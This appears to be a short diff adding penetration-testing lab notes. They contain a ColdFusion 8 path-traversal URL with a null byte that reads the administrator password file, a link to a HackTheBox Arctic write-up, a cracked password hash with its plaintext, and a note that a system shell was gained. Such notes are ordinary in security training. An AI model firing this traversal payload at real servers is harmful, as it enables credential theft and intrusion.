@@ -1,0 +1,11 @@
+------------------
+NOTES
+------------------
+
+http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
+
+
+AAFDC23870ECBCD3D557B6423A8982134E17927E:pass123
+
+system shell after follwoing the writeup
